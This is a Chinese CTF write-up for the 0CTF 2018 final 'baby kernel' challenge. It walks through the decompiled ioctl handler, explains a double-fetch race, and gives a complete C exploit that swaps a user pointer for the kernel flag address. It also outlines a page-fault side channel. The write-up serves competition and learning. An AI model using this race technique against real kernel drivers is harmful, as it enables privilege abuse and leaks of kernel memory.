---
title: 0CTF final baby kernel
tags:
  - kernel
date: 2018/6/4
---

第一次做出kernel题，感谢大佬们的帮助orzorz

程序逻辑：

```
signed __int64 __fastcall baby_ioctl(__int64 a1, __int64 a2)
{
  __int64 v2; // rdx
  signed __int64 result; // rax
  int i; // [rsp-5Ch] [rbp-5Ch]
  __int64 v5; // [rsp-58h] [rbp-58h]

  _fentry__(a1, a2);
  v5 = v2;
  if ( a2 == 0x6666 )
  {
    printk("Your flag is at %px! But I don't think you know it's content\n", flag);
    result = 0LL;
  }
  else if ( a2 == 0x1337
         && !_chk_range_not_ok(v2, 0x10LL, *(__readgsqword(&current_task) + 0x1358))// a3 >= a1+a2
         && !_chk_range_not_ok(*v5, *(v5 + 8), *(__readgsqword(&current_task) + 0x1358))
         && *(v5 + 8) == strlen(flag) )
  {
    for ( i = 0; i < strlen(flag); ++i )
    {
      if ( *(*v5 + i) != flag[i] )
        return 22LL;
    }
    printk("Looks like the flag is not a secret anymore. So here is it %s\n", flag);
    result = 0LL;
  }
  else
  {
    result = 14LL;
  }
  return result;
}
```

程序通过ioctl来做交互

```
int fd = open("/dev/baby",0);
int ret = ioctl(fd,0x6666);
```

这样就能触发上面的打印flag地址。

通过ida我们知道flag长度为33字节，但内容本地和远程肯定是不同的，而flag放在内核态，因此我们没法直接看到。

当第二个参数为0x1337时，v5是我们传入的第三个参数，是一个如下的结构体
```
struct t{
	char * flag;
	size_t size; 
};
```

这个`_chk_range_not_ok`是判断a1+a2是否小于a3。

但a3这个值我们不好直接看出来。可以尝试调试一下，调试方法可以见上一篇环境配置。

![](kernel_5ba197ee799db9ceec3ec7b42eaba522.png)

通过观察，我们推测上面这个判断是判断v5以及v5->flag是否为用户态，非用户态则直接返回。

那这里就有两种做法了。

第一种是正解，因为这里有一个**double fetch**的洞。

![](kernel_fa1eb17766936af85c599c8428a7e704.png)

这两块其实是分开的，也就是说v5和v5->flag在上面进行了范围的判断，通过后再通过v5获取v5->flag进行内容的判断，而我们可以在这两部中间进行竞争，通过上面的检查后就把v5->flag偷换成内核中真正flag的地址。从而自身与自身做比较，通过检查得到flag。

exp：

```cpp
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <pthread.h>

#define TRYTIME 0x1000

char s[] =   "flag{AAAA_BBBB_CC_DDDD_EEEE_FFFF}";
//char s2[] = "flag{THIS_WILL_BE_YOUR_FLAG_1234}";

struct t{
	char * flag;
	size_t size; 
};


char* flagaddr=NULL;

int finish = 0;

void * run_thread(void * vvv)
{	
	struct t* v5 = vvv;
	while(!finish) {
		v5->flag = flagaddr;
	}	
	
}

int main(){
	
	setvbuf(stdin,0,2,0);
	setvbuf(stdout,0,2,0);
	setvbuf(stderr,0,2,0);

	printf("{==DBG==} this is exp :p\n\n");

	int fd = open("/dev/baby",0);
	printf("{==DBG==} fd: %d\n",fd);
	int ret = ioctl(fd,0x6666);

	scanf("%px",&flagaddr);
	printf("{==DBG==} get addr: %p\n",flagaddr);

	struct t * v5 = (struct t * )malloc(sizeof(struct t));

	v5->size = 33;
	v5->flag = s;

	pthread_t t1;

	pthread_create(&t1, NULL, run_thread,v5);

	for(int i=0;i<TRYTIME;i++){
		ret = ioctl(fd, 0x1337, v5);
		if(ret != 0){
			//printf("{==DBG==} ret: %d\n",ret);
			printf("{==DBG==} addr: %p\n",v5->flag);
		}else{
			goto end;
		}
		v5->flag = s;
	}
end:
	finish = 1;

	pthread_join(t1, NULL);
	close(fd);

	return 0;
}
```

偷鸡的解法可以用侧信道来做。当然我的做法不是特别好。

![](kernel_be98acba57db480bbc0d46c6b48ffa35.png)

i++以后，*v5+i不一定是一个实际存在的地址，只需将flag写在page的末尾即可，这样如果正确，执行i++后，接下来就会触发pagefault，从而得知一位flag。然后逐位得到flag。

如果有比较正常的侧信道做法，希望大佬能够告诉我一下。
